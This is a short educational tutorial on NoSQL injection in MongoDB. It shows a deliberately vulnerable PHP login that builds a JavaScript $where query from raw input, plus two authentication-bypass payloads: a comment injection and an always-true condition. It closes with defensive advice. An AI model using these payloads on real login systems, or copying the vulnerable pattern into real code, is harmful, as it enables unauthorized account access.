# Injecting into NoSQL

**NoSQL** refers to a broad class of databases that deviate from traditional relational databases. Instead of tables with fixed schemas, NoSQL systems typically use **key/value mappings**, which allow for more flexible and hierarchical data storage.

---

## **Key Characteristics of NoSQL**

* No fixed schema — data values can take on arbitrary structures.
* Suitable for large data sets with hierarchical data.
* Efficient data retrieval without the need for expensive table joins.
* Each NoSQL product often implements its **own query format** — unlike SQL, there is **no universal query language**.

---

## **NoSQL Query Mechanisms**

Depending on the system, queries can be performed via:
* **Key/value lookups**
* **XPath expressions** (covered later)
* **Embedded programming languages** such as **JavaScript** (common in MongoDB)

---

## **Security Perspective**

* SQL injection is well understood and relatively standardized across databases.
* NoSQL injection is **less explored** and **highly implementation-specific**.
* Attack surface arises when:
  - The query is **constructed dynamically** from user input.
  - The underlying query language **allows executable logic** (e.g., JavaScript).

> 🔍 Most NoSQL injection vectors resemble **classic injection flaws**, where unsanitized input is embedded into executable logic.

---

## **Example: Injecting into MongoDB**

MongoDB uses **JavaScript** for some queries, such as those leveraging the `$where` clause. If a developer inserts user input directly into a dynamic JavaScript function, it becomes vulnerable.

---

### **Vulnerable Code Example**
```php
$m = new Mongo();
$db = $m->cmsdb;
$collection = $db->user;

$js = "function() {
  return this.username == '$username' & this.password == '$password'; }";

$obj = $collection->findOne(array('$where' => $js));

if (isset($obj['uid'])) {
  $logged_in = 1;
} else {
  $logged_in = 0;
}
```

---

### **Exploitation via JavaScript Injection**

#### **Payload 1: Comment Injection**
**Username**: `Marcus'//`  
**Password**: `anything`

#### **Resulting Injected Query:**
```javascript
function() {
  return this.username == 'Marcus'//'
  & this.password == 'anything';
}
```
* The `//` JavaScript comment **terminates the logic**, effectively bypassing the password check.

---

#### **Payload 2: Always-True Logic**
**Username**: `a' || 1==1 || 'a'=='a`  
**Password**: `anything`

#### **Resulting Logic:**
```javascript
function() {
  return (this.username == 'a' || 1==1) || ('a'=='a' & this.password == 'anything');
}
```
* The expression **`1==1` is always true**, which causes the function to match all documents.

---

## **Key Takeaways**

* NoSQL injections are **query-context dependent**, unlike SQLi which often revolves around `'`.
* Attackers may exploit **JavaScript execution**, **JSON-based input**, or other scripting contexts.
* Many examples appear **contrived** now, but as adoption grows, so will real-world vulnerability prevalence.
* Secure coding practices — especially **parameterization and input validation** — are equally important for NoSQL as they are for traditional databases.

---
